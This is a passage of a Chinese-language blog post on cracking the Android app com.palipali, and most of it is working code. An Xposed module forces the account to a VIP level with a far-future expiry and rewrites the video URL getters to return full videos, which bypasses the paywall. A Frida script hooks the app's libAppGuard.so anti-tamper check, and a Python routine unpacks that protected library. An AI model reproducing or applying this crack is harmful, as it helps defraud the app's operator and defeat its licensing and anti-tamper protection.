class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.prometronome;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainHook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url240</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">url480</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">&quot;com.palipali&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;[+] Loaded com.palipali, start hooking...&quot;</span>);</span><br><span class="line">        dumpProcMaps();</span><br><span class="line">        hookUserInfo(lpparam);</span><br><span class="line">        hookResponseUrl(lpparam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpProcMaps</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/self/maps&quot;</span>));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;[MAPS] &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;ERROR dumpProcMaps: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------------------------</span></span><br><span class="line">    <span class="comment">// Hook ResponseUserInfo：强制 VIP</span></span><br><span class="line">    <span class="comment">// -----------------------------</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">hookUserInfo</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cls = XposedHelpers.findClass(</span><br><span class="line">                    <span class="string">&quot;com.palipali.model.response.ResponseUserInfo&quot;</span>,</span><br><span class="line">                    lpparam.classLoader</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            XposedBridge.log(<span class="string">&quot;[+] Hooking ResponseUserInfo ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 强制 level=2 (VIP)</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;setLevel&quot;</span>, <span class="type">int</span>.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[VIP] force level = 2&quot;</span>);</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 强制 expiry 很久</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;setExpiry&quot;</span>, <span class="type">long</span>.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[VIP] force expiry = 1799999999&quot;</span>);</span><br><span class="line">                    param.args[<span class="number">0</span>] = <span class="number">1799999999L</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打印检查</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">thiz</span> <span class="operator">=</span> param.thisObject;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> <span class="variable">level</span> <span class="operator">=</span> (<span class="type">int</span>) XposedHelpers.callMethod(thiz, <span class="string">&quot;getLevel&quot;</span>);</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">vipTrial</span> <span class="operator">=</span> (<span class="type">boolean</span>) XposedHelpers.callMethod(thiz, <span class="string">&quot;getVipTrial&quot;</span>);</span><br><span class="line">                    <span class="type">long</span> <span class="variable">expiry</span> <span class="operator">=</span> (<span class="type">long</span>) XposedHelpers.callMethod(thiz, <span class="string">&quot;getExpiry&quot;</span>);</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">trialResult</span> <span class="operator">=</span> (<span class="type">boolean</span>) XposedHelpers.callMethod(thiz, <span class="string">&quot;getTrialResult&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[UserInfo] &quot;</span> + param.getResult());</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;    level       = &quot;</span> + level);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;    vipTrial    = &quot;</span> + vipTrial);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;    expiry      = &quot;</span> + expiry);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;    trialResult = &quot;</span> + trialResult);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;ERROR hookUserInfo: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------------------------</span></span><br><span class="line">    <span class="comment">// Hook ResponseVideoUrl → 返回完整清晰度视频</span></span><br><span class="line">    <span class="comment">// -----------------------------</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">hookResponseUrl</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cls = XposedHelpers.findClass(</span><br><span class="line">                    <span class="string">&quot;com.palipali.model.response.ResponseVideoUrl&quot;</span>,</span><br><span class="line">                    lpparam.classLoader</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            XposedBridge.log(<span class="string">&quot;[+] Hooking ResponseVideoUrl ...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Hook getIntroUrl</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;getIntroUrl&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">intro</span> <span class="operator">=</span> (String) param.getResult();</span><br><span class="line">                    <span class="keyword">if</span> (intro == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] intro = &quot;</span> + intro);</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> intro.substring(intro.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                    url240 = <span class="string">&quot;/media/240/&quot;</span> + filename;</span><br><span class="line">                    url480 = <span class="string">&quot;/media/480/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] FULL video 240 = &quot;</span> + url240);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] FULL video 480 = &quot;</span> + url480);</span><br><span class="line"></span><br><span class="line">                    XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;setQvgaUrl&quot;</span>, url240);</span><br><span class="line">                    XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;setVgaUrl&quot;</span>, url480);</span><br><span class="line"></span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] Overridden qvga/vga to FULL&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Hook getQvgaUrl</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;getQvgaUrl&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(url240);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] qvga = &quot;</span> + url240);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Hook getVgaUrl</span></span><br><span class="line">            XposedHelpers.findAndHookMethod(cls, <span class="string">&quot;getVgaUrl&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">                    param.setResult(url480);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;[URL] vga = &quot;</span> + url480);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;ERROR hookResponseUrl: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511222202429.png" alt="image-20251122220233142"></p><p>看了下用的这个so的是脱壳时才会用到，闪退也是没进入广告就闪退了</p><p>因此就是脱壳时so文件做了检测</p><p>向上追溯ida就是一个init方法</p><p>现在的问题是如何绕过</p><p>为了方便可以先用fridahook下确定</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> so_name = <span class="string">&quot;libAppGuard.so&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> sub_2F02F8_offset = <span class="number">0x2F02F8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexDump</span>(<span class="params">ptr, len=<span class="number">64</span></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">hexdump</span>(ptr, &#123;<span class="attr">length</span>: len&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(hex dump failed)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(so_name);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">module</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] Cannot find module:&quot;</span>, so_name);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Module base =&quot;</span>, <span class="variable language_">module</span>.<span class="property">base</span>);</span><br><span class="line">    <span class="keyword">let</span> target = <span class="variable language_">module</span>.<span class="property">base</span>.<span class="title function_">add</span>(sub_2F02F8_offset);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] sub_2F02F8 address =&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(target, &#123;</span><br><span class="line">        <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg_i</span> = args[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg_a1</span> = args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n========== sub_2F02F8 called ==========&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i      =&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg_i</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a1 ptr =&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg_a1</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> s = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(<span class="variable language_">this</span>.<span class="property">arg_a1</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] a1 string:&quot;</span>, s);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] a1 is not valid UTF-8:&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Hex dump a1:&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexDump</span>(<span class="variable language_">this</span>.<span class="property">arg_a1</span>, <span class="number">128</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跟xposed配合使用调试</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511222204833.png" alt="image-20251122220445613"></p><p>果然在libAppGuard.so被kill了</p><p>在这里被kill了</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511242234586.png"></p><p>解密出来</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511242234143.png" alt="image-20251124223447864"></p><p>分析不动了</p><p>解混淆代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">path = Path(<span class="string">&quot;libAppGuard.so&quot;</span>).read_bytes()</span><br><span class="line">src_off, src_len, dst_len = <span class="number">0x2fad0</span>, <span class="number">0x126bf2</span>, <span class="number">0x289144</span></span><br><span class="line">s = path[src_off:src_off + src_len]</span><br><span class="line">dst = <span class="built_in">bytearray</span>(dst_len)</span><br><span class="line"></span><br><span class="line">w7 = w9 = w4 = <span class="number">0</span></span><br><span class="line">w11 = <span class="number">0x7fffffff</span></span><br><span class="line">w5 = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    w6 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">    w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> w6 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">        w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> w4 &amp; <span class="number">0x100</span>:</span><br><span class="line">        <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">        dst[w7] = s[w9]; w9 += <span class="number">1</span>; w7 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    w6 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">        w6 = (w6 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">            w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">        w8 = (w4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>; w6 = (w6 + w8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">        w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">            w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> w4 &amp; <span class="number">0x100</span>: <span class="keyword">break</span></span><br><span class="line">        w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">        w6 = (w6 + w11) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w6 = (w6 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">            w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">        w8 = (w4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>; w6 = (w6 + w8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> w6 != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">        w6 = (w6 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w5 = s[w9]; w9 += <span class="number">1</span></span><br><span class="line">        w6 = (w6 - <span class="number">0x300</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w5 = (w5 + w6) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w5 == <span class="number">0xffffffff</span>: <span class="keyword">break</span></span><br><span class="line">        w6 = (w5 &amp; <span class="number">1</span>) ^ <span class="number">1</span></span><br><span class="line">        w5 = (w5 &gt;&gt; <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">        w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">            w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">        w6 = (w4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">        w6 = (w6 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">            w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">        w8 = (w4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>; w6 = (w6 + w8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> w6 != <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        w6 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">            w6 = (w6 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">                w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">            w8 = (w4 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">1</span>; w6 = (w6 + w8) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            w8 = w4 &amp; <span class="number">0x7f</span></span><br><span class="line">            w4 = (w4 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">if</span> w8 == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> w9 &gt;= <span class="built_in">len</span>(s): <span class="keyword">break</span></span><br><span class="line">                w4 = ((s[w9] &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>; w9 += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (w4 &amp; <span class="number">0x100</span>): <span class="keyword">continue</span></span><br><span class="line">            w6 = (w6 + <span class="number">2</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> w5 &gt; <span class="number">0x500</span>:</span><br><span class="line">        w6 = (w6 + <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    dst[w7] = dst[w7 - w5]; w7 += <span class="number">1</span></span><br><span class="line">    x8 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        dst[w7 + x8] = dst[w7 - w5 + x8 + <span class="number">1</span>]</span><br><span class="line">        x8 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> w6 == x8: <span 